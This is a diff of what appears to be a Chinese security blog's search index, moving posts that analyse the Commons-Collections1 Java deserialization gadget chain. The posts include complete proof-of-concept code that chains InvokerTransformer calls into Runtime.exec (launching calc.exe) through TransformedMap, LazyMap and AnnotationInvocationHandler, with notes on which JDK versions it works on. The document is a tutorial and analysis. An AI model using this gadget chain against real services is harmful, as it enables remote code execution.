-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331214746603-820866591.png" alt="image-20220331214746902"></p>
-<h3 id="ChainedTransformer分析"><a href="#ChainedTransformer分析" class="headerlink" title="ChainedTransformer分析"></a>ChainedTransformer分析</h3><p>poc代码继续往下分析，可以看到如下代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer transformerChain = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
-
-<p>将<code>transformers</code>数组传入<code>ChainedTransformer</code>构造方法里面。在构造方法中将<code>transformers</code>赋值给本类的成员变量<code>iTransformers</code></p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215100803-248909615.png" alt="image-20220331215101175"></p>
-<p>该类同样存在<code>transform</code>方法</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215116522-1090283627.png" alt="image-20220331215116950"></p>
-<p><code>transform</code>方法的作用会遍历<code>transformers</code>数组，然后逐个去调用它的<code>transform</code>方法。 并且还可以看出该方法会将第一次的执行结果传递给第二次执行的参数里面去。知道了<code>ChainedTransformer</code>的作用后，我们需要知道的是<code>ChainedTransformer</code>的<code>transform</code>什么时候会被调用。继续往下调试</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215715399-2078158251.png" alt="image-20220331215715632"></p>
-<p>进入<code>setValue</code>方法，继续跟进，可以在<code>TransformedMap#checkSetValue</code>方法中发现调用了<code>ChainedTransformer</code>的<code>transform</code>方法，这里之前在前置学习中就已经分析过了</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215643520-1021755760.png" alt="image-20220331215643925"></p>
-<p>后面自然就循环调用每个<code>Transformer</code>的<code>transform</code>方法</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215923877-1365581574.png" alt="image-20220331215924083"></p>
-<p>根据顺序，会调用第一个<code>ConstantTransformer</code>的<code>transform</code>方法，也就是返回构造函数中设置的<code>iConstant</code>，这里就是<code>Runtime.class</code></p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331220100853-1922932681.png" alt="image-20220331220101252"></p>
-<p>接着往下，就到了InvokerTransformer，可以看到参数input的值是上个Transformer返回的结果Runtime.class，后面就是利用反射拿到Runtime对象，因为Runtime没有构造方法需要调用getRuntime()方法获取到Runtime对象，所以这里的流程是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getClass().getMethod(&quot;getRuntime&quot;,null).invoke() -&gt; Method</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331220634247-69976373.png" alt="image-20220331220634207"></p>
-<p>继续跟，来到第二个<code>InvokerTransformer</code>，分析如上，因为上面获得了一个Method，那么我们就需要调用它的invoke方法来执行，所以这里getMethod方法里的参数值为invoke，第二个参数即参传入的参数类型Object</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331222329052-1798048744.png" alt="image-20220331222329120"></p>
-<p>接着往下，来到第三个<code>InvokerTransformer</code>，也就是最后一个<code>Transformer</code>，这里可以看到输入input成功拿到Runtime对象，现在只需要执行<code>Runtime#exe</code>方法即可，同样先通过<code>getMethod</code>方法拿到exec对应的Method，所以这里<code>getMethod</code>的第一个参数，就是exec，第二个参数即exec方法执行的参数类型String，返回method，然后调用invoke执行，参数为calc.exe。</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331223102527-1052480704.png" alt="image-20220331223102622"></p>
-<p>之后弹出计算器</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331224112146-817721721.png" alt="image-20220331224112138"></p>
-<p>整个过程归纳</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过ConstantTransformer得到Runtime.class,然后再InvokerTransformer反射得到getRuntime方法，然后通过反射执行invoke才能去调用getRuntime方法，这样得到一个Runtime对象，然后再去调用Runtime对象的exec方法去达到命令执行。</span><br></pre></td></tr></table></figure>
-
-<h3 id="transform方法调用分析"><a href="#transform方法调用分析" class="headerlink" title="transform方法调用分析"></a>transform方法调用分析</h3><p>分析下poc中<code>TransformedMap#decorate</code>方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br></pre></td></tr></table></figure>
-
-<p>调试进入decorate方法，然后跟进来到<code>TransformedMap</code>的构造方法</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331224824303-1180474727.png" alt="image-20220331224824509"></p>
-<p>构造方法把传入的map和Transformer进行赋值。那么要想知道<code>ChainedTransformer</code>是如何调用<code>transform</code>方法，只需在当前类中搜索<code>valueTransformer</code>，因为<code>ChainedTransformer</code>是赋值给<code>valueTransformer</code>的，然后在<code>transformValue</code>方法中发现了transform方法的调用</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225033806-1139569585.png" alt="image-20220331225034010"></p>
-<p>继续查找<code>transformValue</code>方法是在哪被调用的，发现在put方法里会调用<code>transformValue</code>方法，从而导致<code>transformValue</code>调用<code>transform</code>方法去执行命令。</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225502658-2009025010.png" alt="image-20220331225503104"></p>
-<p>所以我们在调用<code>TransformedMap#decorate</code>方法绑定transformer之后，再调用put方法也可触发命令执行。</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225850062-1350949135.png" alt="image-20220331225850271"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13779857.html">https://www.cnblogs.com/nice0e3/p/13779857.html</a></p>
-]]></content>
-      <categories>
-        <category>Java安全</category>
-      </categories>
-      <tags>
-        <tag>cc链</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java安全之Commons-Collections1分析（二）</title>
-    <url>/2022/04/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer"/>
-
-<p>继续接着上文，上文我们通过方法调用弹出了计算器，那么在反序列化的漏洞场景下该如何运用呢。</p>
-<span id="more"></span>
-
-<p>下面为完整的调用链</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			AnnotationInvocationHandler.readObject()</span><br><span class="line">				Map(Proxy).entrySet()</span><br><span class="line">					AnnotationInvocationHandler.invoke()</span><br><span class="line">						LazyMap.get()</span><br><span class="line">							ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Class.getMethod()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.getRuntime()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.exec()</span><br></pre></td></tr></table></figure>
-
-<h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>在分析调用链之前，先学习一下<code>LazyMap</code>，这个类和<code>TransformedMap</code>类似，都继承<code>AbstractMapDecorator</code>抽象类</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424181355248-164962512.png" alt="image-20220424181354526"></p>
-<p>根据之前的分析，可以知道<code>TransformedMap</code>的触发点是put()方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">put()-&gt;transformValue()-&gt;ChainedTransformer#transform()</span><br></pre></td></tr></table></figure>
-
-<p>而<code>LazyMap</code>的触发点是在get()方法</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424184102740-394006463.png" alt="image-20220424184103297"></p>
-<p>get()方法的实现是首先判断map的中是否包含传入的key，当key不存在时，就会调用<code>transformerChain</code>的transform()方法。那么，我们根据这个触发点来编写如下poc</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">       //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">       Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">               new ConstantTransformer(Runtime.class),</span><br><span class="line">               new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">       Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       //创建Map并绑定transformerChina</span><br><span class="line">       Map innerMap = new HashMap();</span><br><span class="line">       innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">       </span><br><span class="line">       Map tmpmap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">       tmpmap.get(&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行完get()方法弹出计算器</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003117682-2015149661.png" alt="image-20220425003115659"></p>
-<h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第⼀个参数是⼀个Annotation类类型参数，该类是注解类，第二个是map类型参数。</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003631092-1481504679.png" alt="image-20220425003629840"></p>
-<p>所有的注解类型都继承自Annotation接口</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003958204-372179627.png" alt="image-20220425003956842"></p>
-<p>查看<code>AnnotationInvocationHandler#readObject</code>方法</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425004348631-2058048733.png" alt="image-20220425004347242"></p>
-<p>假设这里我们通过反射调用<code>AnnotationInvocationHandler</code>，并传入两个参数，一个是<code>Retention.class</code>，另一个是<code>outerMap</code>。<code>Retention</code>是一个注解类。<code>outerMap</code>是我们<code>TransformedMap</code>修饰过的类。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class  clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">    construct.setAccessible(true);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure>
-
-<p>这时候在 <code>AnnotationInvocationHandler</code>的<code>readObject</code>方法里面 <code>memberValues</code>就是我们使用反射传入的 <code>TransformedMap</code>的对象。代码中遍历了它的所有元素，并依次设置值。在调用<code>setValue</code>设置值的时候就会触发<code>TransformedMap</code>⾥的<code>Transform</code>方法，从而导致命令的执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">      // for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">           Object value = null;</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">               Object value = memberValue.getValue();</span><br><span class="line">               value = memberValue.getValue();</span><br><span class="line">                if (!(memberType.isInstance(value) ||</span><br><span class="line">                      value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                   memberValue.setValue(</span><br><span class="line">                       new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                   value = new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                               annotationType.members().get(name)));</span><br><span class="line">                               annotationType.members().get(name));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           mv.put(name, value);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        </span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                            String.class,</span><br><span class="line">                            Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">                            new Class[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                            Object.class,</span><br><span class="line">                            Object[].class &#125;, new Object[] &#123; null, new</span><br><span class="line">                            Object[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class</span><br><span class="line">                    &#125;,</span><br><span class="line">                            new String[] &#123;</span><br><span class="line">                                    &quot;calc.exe&quot; &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformerChain = new</span><br><span class="line">                    ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span><br><span class="line">            Map outerMap = TransformedMap.decorate(innerMap, null,</span><br><span class="line">                    transformerChain);</span><br><span class="line">            Class clazz =</span><br><span class="line">                    Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor construct = clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                    Map.class);</span><br><span class="line">            construct.setAccessible(true);</span><br><span class="line">            InvocationHandler handler = (InvocationHandler)</span><br><span class="line">                    construct.newInstance(Retention.class, outerMap);</span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">            oos.close();</span><br><span class="line">            System.out.println(barr);</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(new</span><br><span class="line">                    ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">            Object o = (Object)ois.readObject();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>运行弹出计算器</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425014904438-114576049.png" alt="image-20220425014902982"></p>
-<p>测试过程发现，jdk1.8.0_321无法达到命令执行的目的，后面换了个jdk1.7.0_21才执行成功</p>
-<p>在高版本中的<code>AnnotationInvocationHandler</code>的<code>readObject</code>是被改动过的，如下为低版本jdk</p>
-<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425015123743-612622047.png" alt="image-20220425015122452"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13791793.html">https://www.cnblogs.com/nice0e3/p/13791793.html</a></p>
-]]></content>
-      <categories>
-        <category>Java安全</category>
-      </categories>
-      <tags>
-        <tag>cc链</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java反序列化漏洞</title>
     <url>/2022/03/22/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer"/>
@@ -803,6 +678,80 @@
       </tags>
   </entry>
   <entry>
+    <title>Java安全之Commons Collections1分析（一）</title>
+    <url>/2022/03/31/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer"/>
+
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CC链的前置基础学习完后，就可以开始学习CC链的具体执行流程。</p>
+<span id="more"></span>
+
+<h3 id="CC链分析"><a href="#CC链分析" class="headerlink" title="CC链分析"></a>CC链分析</h3><p>先来看下poc代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        //创建Map并绑定transformer</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        //给予map数据转化链</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        //触发漏洞</span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span><br><span class="line">        onlyElement.setValue(&quot;test&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面逐一分析</p>
+<p>先看下面这段代码，<code>ConstantTransformer</code>和<code>InvokerTransformer</code>都是<code>Transformer</code>接口的实现类，通过new创建了一个 Transformer类型的数组，里面存储的是 Transformer的实现类对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ConstantTransformer分析"><a href="#ConstantTransformer分析" class="headerlink" title="ConstantTransformer分析"></a>ConstantTransformer分析</h3><p>先来分析一下<code>ConstantTransformer</code></p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331213802750-70517686.png" alt="image-20220331213801907"></p>
+<p>这里是使用了构造方法传入参数，poc中传入的参数为<code>Runtime.class</code>，而在调用到transform时，会返回我们传入的参数，也就是返回这里的<code>iConstant</code>。</p>
+<h3 id="InvokerTransformer分析"><a href="#InvokerTransformer分析" class="headerlink" title="InvokerTransformer分析"></a>InvokerTransformer分析</h3><p>打一个debug跟踪到<code>InvokerTransformer</code>类的构造方法里面</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331214255708-71059607.png" alt="image-20220331214256009"></p>
+<p>可以看到传入到构造方法中有三个参数，第一个是方法名，第二个是参数类型，第三个是参数的值。</p>
+<p>poc里的三个<code>InvokerTransformer</code>的参数值，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getMethod,new Class[]&#123;String.class, Class[].class&#125;,new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;</span><br><span class="line">invoke,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;</span><br><span class="line">exec,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>InvokerTransformer</code>类中同样存在<code>transform</code>方法，后面再具体分析</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331214746603-820866591.png" alt="image-20220331214746902"></p>
+<h3 id="ChainedTransformer分析"><a href="#ChainedTransformer分析" class="headerlink" title="ChainedTransformer分析"></a>ChainedTransformer分析</h3><p>poc代码继续往下分析，可以看到如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer transformerChain = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
+
+<p>将<code>transformers</code>数组传入<code>ChainedTransformer</code>构造方法里面。在构造方法中将<code>transformers</code>赋值给本类的成员变量<code>iTransformers</code></p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215100803-248909615.png" alt="image-20220331215101175"></p>
+<p>该类同样存在<code>transform</code>方法</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215116522-1090283627.png" alt="image-20220331215116950"></p>
+<p><code>transform</code>方法的作用会遍历<code>transformers</code>数组，然后逐个去调用它的<code>transform</code>方法。 并且还可以看出该方法会将第一次的执行结果传递给第二次执行的参数里面去。知道了<code>ChainedTransformer</code>的作用后，我们需要知道的是<code>ChainedTransformer</code>的<code>transform</code>什么时候会被调用。继续往下调试</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215715399-2078158251.png" alt="image-20220331215715632"></p>
+<p>进入<code>setValue</code>方法，继续跟进，可以在<code>TransformedMap#checkSetValue</code>方法中发现调用了<code>ChainedTransformer</code>的<code>transform</code>方法，这里之前在前置学习中就已经分析过了</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215643520-1021755760.png" alt="image-20220331215643925"></p>
+<p>后面自然就循环调用每个<code>Transformer</code>的<code>transform</code>方法</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331215923877-1365581574.png" alt="image-20220331215924083"></p>
+<p>根据顺序，会调用第一个<code>ConstantTransformer</code>的<code>transform</code>方法，也就是返回构造函数中设置的<code>iConstant</code>，这里就是<code>Runtime.class</code></p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331220100853-1922932681.png" alt="image-20220331220101252"></p>
+<p>接着往下，就到了InvokerTransformer，可以看到参数input的值是上个Transformer返回的结果Runtime.class，后面就是利用反射拿到Runtime对象，因为Runtime没有构造方法需要调用getRuntime()方法获取到Runtime对象，所以这里的流程是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getClass().getMethod(&quot;getRuntime&quot;,null).invoke() -&gt; Method</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331220634247-69976373.png" alt="image-20220331220634207"></p>
+<p>继续跟，来到第二个<code>InvokerTransformer</code>，分析如上，因为上面获得了一个Method，那么我们就需要调用它的invoke方法来执行，所以这里getMethod方法里的参数值为invoke，第二个参数即参传入的参数类型Object</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331222329052-1798048744.png" alt="image-20220331222329120"></p>
+<p>接着往下，来到第三个<code>InvokerTransformer</code>，也就是最后一个<code>Transformer</code>，这里可以看到输入input成功拿到Runtime对象，现在只需要执行<code>Runtime#exe</code>方法即可，同样先通过<code>getMethod</code>方法拿到exec对应的Method，所以这里<code>getMethod</code>的第一个参数，就是exec，第二个参数即exec方法执行的参数类型String，返回method，然后调用invoke执行，参数为calc.exe。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331223102527-1052480704.png" alt="image-20220331223102622"></p>
+<p>之后弹出计算器</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331224112146-817721721.png" alt="image-20220331224112138"></p>
+<p>整个过程归纳</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过ConstantTransformer得到Runtime.class,然后再InvokerTransformer反射得到getRuntime方法，然后通过反射执行invoke才能去调用getRuntime方法，这样得到一个Runtime对象，然后再去调用Runtime对象的exec方法去达到命令执行。</span><br></pre></td></tr></table></figure>
+
+<h3 id="transform方法调用分析"><a href="#transform方法调用分析" class="headerlink" title="transform方法调用分析"></a>transform方法调用分析</h3><p>分析下poc中<code>TransformedMap#decorate</code>方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br></pre></td></tr></table></figure>
+
+<p>调试进入decorate方法，然后跟进来到<code>TransformedMap</code>的构造方法</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331224824303-1180474727.png" alt="image-20220331224824509"></p>
+<p>构造方法把传入的map和Transformer进行赋值。那么要想知道<code>ChainedTransformer</code>是如何调用<code>transform</code>方法，只需在当前类中搜索<code>valueTransformer</code>，因为<code>ChainedTransformer</code>是赋值给<code>valueTransformer</code>的，然后在<code>transformValue</code>方法中发现了transform方法的调用</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225033806-1139569585.png" alt="image-20220331225034010"></p>
+<p>继续查找<code>transformValue</code>方法是在哪被调用的，发现在put方法里会调用<code>transformValue</code>方法，从而导致<code>transformValue</code>调用<code>transform</code>方法去执行命令。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225502658-2009025010.png" alt="image-20220331225503104"></p>
+<p>所以我们在调用<code>TransformedMap#decorate</code>方法绑定transformer之后，再调用put方法也可触发命令执行。</p>
+<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220331225850062-1350949135.png" alt="image-20220331225850271"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13779857.html">https://www.cnblogs.com/nice0e3/p/13779857.html</a></p>
+]]></content>
+      <categories>
+        <category>Java安全</category>
+      </categories>
+      <tags>
+        <tag>cc链</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java安全之URLDNS链</title>
     <url>/2022/03/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE/</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer"/>
@@ -893,6 +842,57 @@
       </categories>
       <tags>
         <tag>URLDNS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java安全之Commons-Collections1分析（二）</title>
+    <url>/2022/04/24/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer"/>
+
+<p>继续接着上文，上文我们通过方法调用弹出了计算器，那么在反序列化的漏洞场景下该如何运用呢。</p>
+<span id="more"></span>
+
+<p>下面为完整的调用链</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			AnnotationInvocationHandler.readObject()</span><br><span class="line">				Map(Proxy).entrySet()</span><br><span class="line">					AnnotationInvocationHandler.invoke()</span><br><span class="line">						LazyMap.get()</span><br><span class="line">							ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Class.getMethod()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.getRuntime()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>在分析调用链之前，先学习一下<code>LazyMap</code>，这个类和<code>TransformedMap</code>类似，都继承<code>AbstractMapDecorator</code>抽象类</p>
